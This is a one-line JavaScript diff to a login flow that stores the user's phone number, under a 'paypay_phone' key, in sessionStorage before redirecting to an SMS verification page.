@@ -315,6 +315,7 @@
       }
 
       if (data.status === "sms_required") {
+        sessionStorage.setItem("paypay_phone", phone);
         window.location.href = "sms.html";
       }
 
